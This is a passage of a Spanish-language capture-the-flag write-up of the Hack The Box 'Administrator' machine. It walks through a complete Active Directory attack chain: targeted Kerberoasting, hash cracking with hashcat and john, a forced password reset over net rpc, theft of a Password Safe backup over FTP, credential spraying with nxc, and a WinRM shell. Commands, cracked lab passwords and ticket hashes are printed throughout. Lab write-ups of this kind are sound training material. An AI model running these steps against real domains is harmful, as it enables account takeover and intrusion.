+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo ntpdate -u 10.10.11.42
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> contraseña para borhub:
+</span></span><span class="line"><span class="cl"><span class="m">30</span> Jun 22:24:57 ntpdate<span class="o">[</span>18024<span class="o">]</span>: step <span class="nb">time</span> server 10.10.11.42 offset +25191.690143 sec
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ ./targetedKerberoast.py --dc-ip 10.10.11.42 -d <span class="s1">&#39;ADMINISTRATOR.htb&#39;</span> -u <span class="s1">&#39;Olivia&#39;</span> -p <span class="s1">&#39;ichliebedich&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting kerberoast attacks
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Fetching usernames from Active Directory with LDAP
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Printing <span class="nb">hash</span> <span class="k">for</span> <span class="o">(</span>michael<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$23$*</span>michael<span class="nv">$ADMINISTRATOR</span>.HTB<span class="nv">$ADMINISTRATOR</span>.htb/michael*<span class="nv">$b83c2c411adef0b972d360a349a93078$567</span>cd69e9bdedfc998d2261dcfb017076372141f3b53fcfca0b7dfa23f0b7b5039f232a74737ce172fdb1e4d1952e74726694f31760562f5e3d1d0e0808f6da11ae57e876e09dc6518e0dcd35af501b146d43d80adc8c493a1894c0ceb9c84a7ff2fc8b3bbef1070c540175b28e3836d950d39713679dfd7d0f95f3e1a750be697462baaf08aa66470c71a6ea21947a2445d67a838b4feb5da475d21cac896a58c84d04ed8949544a40aa5f13b9dbda6739233a74cb638983b15b2367ef0f71cec6ade9579fa056f9f8aeab82064d86267e6ad14ed9be09ce2bfa4181811b28e8e1277cd08d420a339c19be0476bdf13af159adb136a574dfe781b7b7236f8813f1f58434f507e709bba835b1780b06e4ad9c815c1447f55e0ea280a73a87ab2d280e31af7474eff1bf797147d07487d833526368a3381b3e3af66c43909c2046a1beea875b5e89328dded1bc580885cbdce1714724a4f76b5fcfd8fa0e7eb1a16034177d84943bed7d4297bfbfd9d2ad7814b12dd03241f9bb7514649e0de0ed00cf218d30f958da469eb0770b0e99feaf78b5990eef985eb4e929caad12b682cb0380627434702f165700c994a8cdf77ea614499a3c447898d5964000192a5ac5ad60864f649646b07a2186bef66c525d3ba3ae308172bd01c69f7f7228bb674912a16514fdf9242b7d573de2d9151407259d49cca6fcdcc369a6102cfffec921daa988b7789a3b14f091c3543ce054f13274c7abc85febd52124e9403b8538cdd3b3d10bd5e9f9d008a06260af49af1ddd7425aec410a99c3ff218cfabe9134535440db9d29439766b51ef6eb7dd7cd74e6e7c9f609fc42fab6212c2f41fe4a4e26fb71cf1ecc25b3aacf842acdd40a5b41f3001248dfe721b13d59fd17b14709d1e443d358390d4679e620f0304f757db0e7f2cd80bb570d859ee43921221443c1ce495ef173c663c6a2b620a397072e2882e36558e0e19fdbb19e69e02e588066a185eee7082246122e1d8aea5636049cc23d83cb2ae7167f7e5810fbda1585c1c77db1eafcf46088b03b7b70bcef1f0bf8146fbe3b8a4922f293141c83a990add33b883775e1c4dee2b103cd704b6920eacba3bb3a1d6042385e07632f56167690543ee59b42bc497b6a90574c28b2a323ef99b19516c22ac5d1d31b8a1fa1e15e75558ea3ede543ddc2332acb54dab40c6c09c79480745a04441761780a023bbf29fb3a34ce245eea6405651d64a70e0cbb0ed67c41d8fb9ce796771cee011578d282d254f17175f6965bb0296195ba1598b74ad9317fd8f2bb32a33bce2f718c1e0ef8d802b30ae9167e19209348dca0ed9c783af3e43bdff6498ed24cc621ef7ce6763e29155ee918255896c0f68865320ab62895af2a242338f7bf8ea116f8b29d0d76c482eef440f6500520f57a0d718b82248403e5a727061fa0fd217b7fba426ec01a769dd6fd45abb04016666903ead5d34894a9cff84a27fbac1f92e0a6f02d268a445f03b5ca526402f32104819250c6
+</span></span></code></pre></div><p>Una vez lanzado el ataque vemos que nos devuelve el <code>TGS</code> del usuario michael con lo cual ahora intentamos crackearlo para obtener la contraseña.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ hashcat -m <span class="m">13100</span> --force -a <span class="m">0</span> kerberohash /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt --force
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...SNIP...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Dictionary cache hit:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">* Filename..: /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
+</span></span><span class="line"><span class="cl">* Passwords.: <span class="m">14344384</span>
+</span></span><span class="line"><span class="cl">* Bytes.....: <span class="m">139921497</span>
+</span></span><span class="line"><span class="cl">* Keyspace..: <span class="m">14344384</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$23$*</span>michael<span class="nv">$ADMINISTRATOR</span>.HTB<span class="nv">$ADMINISTRATOR</span>.htb/michael*<span class="nv">$b83c2c411adef0b972d360a349a93078$567</span>cd69e9bdedfc998d2261dcfb017076372141f3b53fcfca0b7dfa23f0b7b5039f232a74737ce172fdb1e4d1952e74726694f31760562f5e3d1d0e0808f6da11ae57e876e09dc6518e0dcd35af501b146d43d80adc8c493a1894c0ceb9c84a7ff2fc8b3bbef1070c540175b28e3836d950d39713679dfd7d0f95f3e1a750be697462baaf08aa66470c71a6ea21947a2445d67a838b4feb5da475d21cac896a58c84d04ed8949544a40aa5f13b9dbda6739233a74cb638983b15b2367ef0f71cec6ade9579fa056f9f8aeab82064d86267e6ad14ed9be09ce2bfa4181811b28e8e1277cd08d420a339c19be0476bdf13af159adb136a574dfe781b7b7236f8813f1f58434f507e709bba835b1780b06e4ad9c815c1447f55e0ea280a73a87ab2d280e31af7474eff1bf797147d07487d833526368a3381b3e3af66c43909c2046a1beea875b5e89328dded1bc580885cbdce1714724a4f76b5fcfd8fa0e7eb1a16034177d84943bed7d4297bfbfd9d2ad7814b12dd03241f9bb7514649e0de0ed00cf218d30f958da469eb0770b0e99feaf78b5990eef985eb4e929caad12b682cb0380627434702f165700c994a8cdf77ea614499a3c447898d5964000192a5ac5ad60864f649646b07a2186bef66c525d3ba3ae308172bd01c69f7f7228bb674912a16514fdf9242b7d573de2d9151407259d49cca6fcdcc369a6102cfffec921daa988b7789a3b14f091c3543ce054f13274c7abc85febd52124e9403b8538cdd3b3d10bd5e9f9d008a06260af49af1ddd7425aec410a99c3ff218cfabe9134535440db9d29439766b51ef6eb7dd7cd74e6e7c9f609fc42fab6212c2f41fe4a4e26fb71cf1ecc25b3aacf842acdd40a5b41f3001248dfe721b13d59fd17b14709d1e443d358390d4679e620f0304f757db0e7f2cd80bb570d859ee43921221443c1ce495ef173c663c6a2b620a397072e2882e36558e0e19fdbb19e69e02e588066a185eee7082246122e1d8aea5636049cc23d83cb2ae7167f7e5810fbda1585c1c77db1eafcf46088b03b7b70bcef1f0bf8146fbe3b8a4922f293141c83a990add33b883775e1c4dee2b103cd704b6920eacba3bb3a1d6042385e07632f56167690543ee59b42bc497b6a90574c28b2a323ef99b19516c22ac5d1d31b8a1fa1e15e75558ea3ede543ddc2332acb54dab40c6c09c79480745a04441761780a023bbf29fb3a34ce245eea6405651d64a70e0cbb0ed67c41d8fb9ce796771cee011578d282d254f17175f6965bb0296195ba1598b74ad9317fd8f2bb32a33bce2f718c1e0ef8d802b30ae9167e19209348dca0ed9c783af3e43bdff6498ed24cc621ef7ce6763e29155ee918255896c0f68865320ab62895af2a242338f7bf8ea116f8b29d0d76c482eef440f6500520f57a0d718b82248403e5a727061fa0fd217b7fba426ec01a769dd6fd45abb04016666903ead5d34894a9cff84a27fbac1f92e0a6f02d268a445f03b5ca526402f32104819250c6:password
+</span></span></code></pre></div><p>Y comprobamos que las credenciales sean validas con <code>nxc</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.42 -u <span class="s1">&#39;michael&#39;</span> -p <span class="s1">&#39;password&#39;</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:administrator.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC <span class="o">[</span>+<span class="o">]</span> administrator.htb<span class="se">\m</span>ichael:password
+</span></span></code></pre></div><h2 id="forcechangepassword---net-rpc">ForceChangePassword - Net rpc<a hidden class="anchor" aria-hidden="true" href="#forcechangepassword---net-rpc">#</a></h2>
+<p>Si volvemos a comprobar el bloodhound vemos que michael tiene el permiso ForceChangePassword sobre el usuario Benjamin, es decir, tenemos la capacidad de cambiarle la contraseña.</p>
+<p><img alt="Administrator Machine 2" loading="lazy" src="fotos/Administrator_Machine_2.png"></p>
+<p>Lanzamos el comando con <code>net rpc</code> y cambiamos la contraseña a Benjamin a &ldquo;password&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ net rpc password <span class="s2">&#34;benjamin&#34;</span> <span class="s1">&#39;password&#39;</span> -U ADMINISTRATOR.HTB/michael%password -S <span class="s2">&#34;10.10.11.42&#34;</span>
+</span></span></code></pre></div><p>Comprobación de credenciales:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.42 -u <span class="s1">&#39;benjamin&#39;</span> -p <span class="s1">&#39;password&#39;</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:administrator.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC <span class="o">[</span>+<span class="o">]</span> administrator.htb<span class="se">\b</span>enjamin:password
+</span></span></code></pre></div><h1 id="acceso-inicial">Acceso inicial<a hidden class="anchor" aria-hidden="true" href="#acceso-inicial">#</a></h1>
+<p>Mirando el bloodhound de benjamin, solo vemos que es miembro del grupo <code>Share Moderators</code>. Esto me puede dar una pista que puede tener permiso en algún tipo de carpeta compartida. Al principio del escaneo habíamos visto que el puerto 21 (ftp) se encontraba abierto, con lo cual, intentamos conectarnos con estas credenciales.</p>
+<h2 id="ftp-enumeration">FTP Enumeration<a hidden class="anchor" aria-hidden="true" href="#ftp-enumeration">#</a></h2>
+<p>Nos conectamos a el servidor ftp y descubrimos el archivo &ldquo;Backup.psafe3&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ftp 10.10.11.42
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Connected to 10.10.11.42.
+</span></span><span class="line"><span class="cl"><span class="m">220</span> Microsoft FTP Service
+</span></span><span class="line"><span class="cl">Name <span class="o">(</span>10.10.11.42:borhub<span class="o">)</span>: benjamin
+</span></span><span class="line"><span class="cl"><span class="m">331</span> Password required
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl"><span class="m">230</span> User logged in.
+</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is Windows_NT.
+</span></span><span class="line"><span class="cl">ftp&gt; ls
+</span></span><span class="line"><span class="cl"><span class="m">200</span> PORT <span class="nb">command</span> successful.
+</span></span><span class="line"><span class="cl"><span class="m">125</span> Data connection already open<span class="p">;</span> Transfer starting.
+</span></span><span class="line"><span class="cl">10-05-24 09:13AM <span class="m">952</span> Backup.psafe3
+</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.
+</span></span><span class="line"><span class="cl">ftp&gt; get Backup.psafe3
+</span></span><span class="line"><span class="cl"><span class="m">200</span> PORT <span class="nb">command</span> successful.
+</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening ASCII mode data connection.
+</span></span><span class="line"><span class="cl">WARNING! <span class="m">3</span> bare linefeeds received in ASCII mode
+</span></span><span class="line"><span class="cl">File may not have transferred correctly.
+</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.
+</span></span><span class="line"><span class="cl"><span class="m">952</span> bytes received in 0,1237 seconds <span class="o">(</span>7,5134 kbytes/s<span class="o">)</span>
+</span></span></code></pre></div><p>Vemos que hemos obtenido un archivo <code>.psafe3</code> que se suele asociar a los archivos que tienen una base de datos de credenciales almacenadas de la aplicación Password Safe. Así que nos instalamos la aplicación Password Safe y intentamos abrir el archivo con ella, pero nos pide una contraseña la cual no tenemos:</p>
+<p><img alt="Administrator Machine 3" loading="lazy" src="fotos/Administrator_Machine_3.png"></p>
+<p>Como no tenemos la contraseña, vamos a intentar sacar el hash con la herramienta <code>psafe2john</code> sacada del John the ripper jumbo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ./pwsafe2john.py /home/borhub/Workspace/HTB/Administrator/CONTENT/Backup.psafe3
+</span></span><span class="line"><span class="cl">Backu:<span class="nv">$pwsafe$*</span>3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
+</span></span></code></pre></div><p>Y ahora vamos a crackearlo con jhon.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ john backuphash --wordlist<span class="o">=</span>/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Warning: detected <span class="nb">hash</span> <span class="nb">type</span> <span class="s2">&#34;pwsafe&#34;</span>, but the string is also recognized as <span class="s2">&#34;pwsafe-opencl&#34;</span>
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--format=pwsafe-opencl&#34;</span> option to force loading these as that <span class="nb">type</span> instead
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>pwsafe, Password Safe <span class="o">[</span>SHA256 128/128 AVX 4x<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">2048</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Will run <span class="m">16</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">tekieromucho <span class="o">(</span>Backu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1g 0:00:00:00 DONE <span class="o">(</span>2025-07-01 00:13<span class="o">)</span> 3.703g/s 30340p/s 30340c/s 30340C/s 123456..total90
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed
+</span></span></code></pre></div><p>Si vemos la salida que tenemos al listar usuarios vemos que existen los siguientes:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.42 -u <span class="s1">&#39;benjamin&#39;</span> -p <span class="s1">&#39;password&#39;</span> --users
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:administrator.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC <span class="o">[</span>+<span class="o">]</span> administrator.htb<span class="se">\b</span>enjamin:password
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC -Username- -Last PW Set- -BadPW- -Description-
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC Administrator 2024-10-22 18:59:36 <span class="m">0</span> Built-in account <span class="k">for</span> administering the computer/domain
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC Guest &lt;never&gt; <span class="m">0</span> Built-in account <span class="k">for</span> guest access to the computer/domain
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC krbtgt 2024-10-04 19:53:28 <span class="m">0</span> Key Distribution Center Service Account
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC olivia 2024-10-06 01:22:48 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC michael 2025-06-30 00:11:02 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC benjamin 2025-06-30 20:45:09 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC emily 2024-10-30 23:40:02 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC ethan 2024-10-12 20:52:14 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC alexander 2024-10-31 00:18:04 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC emma 2024-10-31 00:18:35 <span class="m">0</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC <span class="o">[</span>*<span class="o">]</span> Enumerated <span class="m">10</span> <span class="nb">local</span> users: ADMINISTRATOR
+</span></span></code></pre></div><p>Ahora vamos a copiar los usuarios y las contraseñas obtenidas en Password Safe a los archivos user y password para luego comprobar las credenciales.</p>
+<p><img alt="Administrator Machine 4" loading="lazy" src="fotos/Administrator_Machine_4.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb 10.10.11.42 -u users -p passwords
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC <span class="o">[</span>*<span class="o">]</span> Windows Server <span class="m">2022</span> Build <span class="m">20348</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:administrator.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB 10.10.11.42 <span class="m">445</span> DC <span class="o">[</span>+<span class="o">]</span> administrator.htb<span class="se">\e</span>mily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
+</span></span></code></pre></div><p>Una vez comprobadas las credenciales iniciamos sesión a través de <code>winrm</code> y conseguimos la user flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ evil-winrm -i 10.10.11.42 -u emily -p <span class="s1">&#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="s1">&#39;quoting_detection_proc&#39;</span> <span class="k">for</span> module Reline
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\e</span>mily<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ../Desktop/user.txt
+</span></span><span class="line"><span class="cl">62b2bb880ec2520e82847e082e86e18b
+</span></span></code></pre></div><h1 id="escalada-de-privilegios">Escalada de privilegios<a hidden class="anchor" aria-hidden="true" href="#escalada-de-privilegios">#</a></h1>
+<p>Si miramos los permisos ACL que tiene el usuario emily, vemos que tiene permisos <code>GenericWrite</code> sobre el usuario ethan.</p>
+<p><img alt="Administrator Machine 5" loading="lazy" src="fotos/Administrator_Machine_5.png"></p>
+<h2 id="kerberoast-attack-1">Kerberoast attack<a hidden class="anchor" aria-hidden="true" href="#kerberoast-attack-1">#</a></h2>
+<p>Volvemos a lanzar el ataque kerberoasting para obtener el <code>Ticket Garanting Service (TGS)</code> cifrado con el hash NTLM/NTHash de la cuenta solicitada.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ./targetedKerberoast.py --dc-ip 10.10.11.42 -d <span class="s1">&#39;ADMINISTRATOR.htb&#39;</span> -u <span class="s1">&#39;emily&#39;</span> -p <span class="s1">&#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting kerberoast attacks
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Fetching usernames from Active Directory with LDAP
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Printing <span class="nb">hash</span> <span class="k">for</span> <span class="o">(</span>ethan<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$23$*</span>ethan<span class="nv">$ADMINISTRATOR</span>.HTB<span class="nv">$ADMINISTRATOR</span>.htb/ethan*<span class="nv">$66</span>eaa14ca29fe4fbfadfc7dc81b18730<span class="nv">$6</span>b3b78c7fd664d7d39d3bff5567328b10759306a4cf7124e1322e63c4abdfe419bff877d4c7e74eccc542951d18016ca5b0f3ccefddd2bdba597c50b8ff4faf2db3a3d82b7c507564f76c2d26695430ebc6faa36cff5993e9d275068a201c8668436887b8719725535a091fce09ac2ddf028fb093abb3898a6086f229967de5c4a7f5fd20d6035273723d038849da8e3b2bac0372e37472e17604772e498e619e95c4a3d736479d6837762131a2b995f9368fd9ffccc76620b25ad893e9a36e922cff25fe07f56b975a7ca1c38660888e9be0662ced2d9340491383b4cbe0d05c2578b66f3470bd07d4e0de11ff819a2622a6348e7c21b6127c513bdec7fc890b51729aca24195349f06fcf205b71a9d3f074cfa3157f87cf31c070fe44a1abbc1a4ea5a23825437acc30999d5abdfbee0be38ad583526abf44dac8b60a0f48b0ade25abaa906c469ab1f00307b76178dbef0cf767320ba1868c052bb9e318d3cddbea6e4059fd6aaa99600ba6e969ec7144b688963f402793b03118a961627a55fefd040b4e8255347da60787d9b301039fb777746a639808f7627fd23f2ef297c370b7058408abf4e901bef2a1cb4d26ce231a6825400e13e9f34c42dd9b7ee7de233e1f4f97327109ba7f8a5633f40bcaa90e624f5bba2da30f449ee39b29d9de793fbbd7e90ccd10105d3c375b42bab66ff911dbc1c7ecf7c790e865f41b89e2fe87434aefda2a5e5eb93f004ce780384a9706d522be678dcfe5b98e8f4eb33ac12311b017023747f5318dda3a67a04358cccd4d38a554a3d8d09fe380f8535b6bc4e1504bcc3d169837a6fad24ca7b3df9ab8a7d1cbc00877e35da141f24f35a19a1dd1c134b4410964a0ae0c18ad25af5a54a628e18fb3d1ec5da93d6e518a7b09d21e9dc3a3d627b80a39623ad685b2ee90e10fe4c710d4c9d0b0f145ca737ab8527074b8b5ea9cc1fa0b67be253660fab9cd18ccf34c8c14dee30d0b830ea16f2bf314ed44f060a7cf5bd1bf2cf93337f2b8f5d52b6e6fd331d52a7a85626db1d11249e5dadb758c0c8cca517fa5c629678a957f5b29c3ca5f9ee1d93fcf40af608ae7c34a4e3ef3838756b2108c08a7e9689394c781ae3d7f2313261b3f23f1e2d6fd0bec5a40a500952f3b300723c6679648a9b861413c6a4c5f361eb3f9a7d472567f517efe25977ddbc0c9f53d8c2aad0ab7022aa9f31e256ca8bb37a04c00d08e6cd7629a1187e90e9ecbe4e5eb2035f0a8dc87d16d21655e9590784ebc3b8c55dcbcd77b5cd089bc52af5538b067ae3aa3f862128fd17e2e24b497e2da67cad4a6c851f0261a9018858e3ac74f3974008f73301e491b5227e514222fdd43f7ea2938548e593fdd3a17effc62ae7b49066e39f218feb4462e2c0cfbe773f7a477ad9f43b8e80491c861d5c774213dd2d6d5e9766fe2afa21cf7cdafde6727e2ccd43acffa47b822b087dfdcbe11d0bcba892c73fdc2325cf2201101f2e3a85fe5b87b76935eb792631d0b4f5836e9f33c09c36608179ab6c0
+</span></span></code></pre></div><p>Ahora tratamos de crackearlo con hashcat:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ hashcat -m <span class="m">13100</span> --force -a <span class="m">0</span> kerberohash /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt --force
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...SNIP...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Dictionary cache hit:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">* Filename..: /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
+</span></span><span class="line"><span class="cl">* Passwords.: <span class="m">14344384</span>
+</span></span><span class="line"><span class="cl">* Bytes.....: <span class="m">139921497</span>
+</span></span><span class="line"><span class="cl">* Keyspace..: <span class="m">14344384</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$23$*</span>ethan<span class="nv">$ADMINISTRATOR</span>.HTB<span class="nv">$ADMINISTRATOR</span>.htb/ethan*<span class="nv">$66</span>eaa14ca29fe4fbfadfc7dc81b18730<span class="nv">$6</span>b3b78c7fd664d7d39d3bff5567328b10759306a4cf7124e1322e63c4abdfe419bff877d4c7e74eccc542951d18016ca5b0f3ccefddd2bdba597c50b8ff4faf2db3a3d82b7c507564f76c2d26695430ebc6faa36cff5993e9d275068a201c8668436887b8719725535a091fce09ac2ddf028fb093abb3898a6086f229967de5c4a7f5fd20d6035273723d038849da8e3b2bac0372e37472e17604772e498e619e95c4a3d736479d6837762131a2b995f9368fd9ffccc76620b25ad893e9a36e922cff25fe07f56b975a7ca1c38660888e9be0662ced2d9340491383b4cbe0d05c2578b66f3470bd07d4e0de11ff819a2622a6348e7c21b6127c513bdec7fc890b51729aca24195349f06fcf205b71a9d3f074cfa3157f87cf31c070fe44a1abbc1a4ea5a23825437acc30999d5abdfbee0be38ad583526abf44dac8b60a0f48b0ade25abaa906c469ab1f00307b76178dbef0cf767320ba1868c052bb9e318d3cddbea6e4059fd6aaa99600ba6e969ec7144b688963f402793b03118a961627a55fefd040b4e8255347da60787d9b301039fb777746a639808f7627fd23f2ef297c370b7058408abf4e901bef2a1cb4d26ce231a6825400e13e9f34c42dd9b7ee7de233e1f4f97327109ba7f8a5633f40bcaa90e624f5bba2da30f449ee39b29d9de793fbbd7e90ccd10105d3c375b42bab66ff911dbc1c7ecf7c790e865f41b89e2fe87434aefda2a5e5eb93f004ce780384a9706d522be678dcfe5b98e8f4eb33ac12311b017023747f5318dda3a67a04358cccd4d38a554a3d8d09fe380f8535b6bc4e1504bcc3d169837a6fad24ca7b3df9ab8a7d1cbc00877e35da141f24f35a19a1dd1c134b4410964a0ae0c18ad25af5a54a628e18fb3d1ec5da93d6e518a7b09d21e9dc3a3d627b80a39623ad685b2ee90e10fe4c710d4c9d0b0f145ca737ab8527074b8b5ea9cc1fa0b67be253660fab9cd18ccf34c8c14dee30d0b830ea16f2bf314ed44f060a7cf5bd1bf2cf93337f2b8f5d52b6e6fd331d52a7a85626db1d11249e5dadb758c0c8cca517fa5c629678a957f5b29c3ca5f9ee1d93fcf40af608ae7c34a4e3ef3838756b2108c08a7e9689394c781ae3d7f2313261b3f23f1e2d6fd0bec5a40a500952f3b300723c6679648a9b861413c6a4c5f361eb3f9a7d472567f517efe25977ddbc0c9f53d8c2aad0ab7022aa9f31e256ca8bb37a04c00d08e6cd7629a1187e90e9ecbe4e5eb2035f0a8dc87d16d21655e9590784ebc3b8c55dcbcd77b5cd089bc52af5538b067ae3aa3f862128fd17e2e24b497e2da67cad4a6c851f0261a9018858e3ac74f3974008f73301e491b5227e514222fdd43f7ea2938548e593fdd3a17effc62ae7b49066e39f218feb4462e2c0cfbe773f7